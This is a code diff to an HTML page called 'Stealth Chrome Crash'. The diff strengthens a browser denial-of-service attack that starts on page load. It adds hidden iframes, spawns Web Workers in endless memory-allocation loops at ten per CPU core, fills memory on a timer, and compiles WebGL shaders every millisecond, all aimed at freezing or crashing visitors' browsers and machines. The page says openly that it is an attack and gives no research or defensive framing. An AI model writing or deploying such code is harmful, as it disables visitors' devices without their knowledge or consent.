@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stealth Chrome Crash - No Interaction</title>
+    <title>Stealth Chrome Crash - Maximum Load</title>
 </head>
 <body>
-    <h1>Stealth Chrome Crash - Hidden iframe Attack</h1>
-    <p>This page will execute the attack automatically.</p>
+    <h1>Stealth Chrome Crash - Maximum CPU & Memory Load</h1>
+    <p>The attack starts automatically.</p>
 
     <script>
         function injectHiddenIframes(numFrames) {
@@ -17,11 +17,20 @@
                         function startWorker() {
                             let code = \`while (true) { new Float64Array(1e8); }\`;
                             let blob = new Blob([code], { type: "application/javascript" });
-                            let worker = new Worker(URL.createObjectURL(blob));
+                            let workers = [];
+                            for (let j = 0; j < navigator.hardwareConcurrency * 10; j++) { // MAXIMUM workers
+                                workers.push(new Worker(URL.createObjectURL(blob)));
+                            }
                         }
-                        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) {
-                            startWorker();
+                        startWorker();
+
+                        function overloadMemory() {
+                            let memArray = [];
+                            setInterval(() => {
+                                memArray.push(new Array(1e6).fill(0)); // Max out memory
+                            }, 10);
                         }
+                        overloadMemory();
 
                         var canvas = document.createElement('canvas');
                         var gl = canvas.getContext('webgl');
@@ -33,7 +42,7 @@
                                 gl.compileShader(shader);
                                 shaders.push(shader);
                                 gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 5);
+                            }, 1); // Faster shader execution
                         }
                         crashGPU();
                     <\/script>
@@ -42,9 +51,10 @@
             }
         }
 
-        // Attack starts immediately on page load
-        injectHiddenIframes(8); // Adjust number of hidden crash iframes
+        // Attack starts automatically on page load
+        injectHiddenIframes(10); // Maximum number of hidden iframes
     </script>
 </body>
 </html>
+
 
